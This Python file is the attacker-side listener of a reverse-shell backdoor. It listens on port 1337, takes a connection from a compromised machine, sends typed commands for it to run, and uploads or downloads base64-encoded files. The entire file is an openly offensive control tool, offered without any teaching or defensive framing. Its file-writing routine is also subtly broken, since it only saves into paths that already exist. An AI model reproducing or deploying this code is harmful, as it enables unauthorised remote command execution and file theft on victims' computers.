import socket
import json
import base64
import os

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(1)
        print("[+] Waiting for incoming connections")
        self.connection, address = self.listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):    
        if os.path.isfile(path):
            with open(path, "wb") as file:
                decoded_content = base64.b64decode(content)
                file.write(decoded_content)
            print("[+] Upload successful")
        else:
            print(f"[-] {path} does not exist")

    def read_file(self, path):
        if os.path.isfile(path):
            with open(path, "rb") as f:
                return base64.b64encode(f.read()).decode()
        else:
            print(f"[-] {path} does not exist")

    def run(self):
        while True:
            command = input("> ")
            try:
                if command == "exit":
                    break
                elif command == "clear":
                    print(" " * 2000)
                elif command.split()[0] == "download":
                    result = self.execute_remotely(command)
                    if "[-] Error" not in result:
                        filename = command.split()[1]
                        self.write_file(filename, result)
                        print("[+] File Downloaded as " + filename)
                        print("-> Content : " + result)
                    else:
                        print(result)
                elif command.split()[0] == "upload":
                    file_path = command.split()[1]
                    file_content = self.read_file(file_path)
                    if file_content != None:
                        result = self.execute_remotely(command + " " + file_content)
                        print(result)
                else:
                    result = self.execute_remotely(command)
                    print(result)
            except Exception as e:
                print("[-] Error during command execution:", str(e))

my_listener = Listener("0.0.0.0", 1337)
my_listener.run()
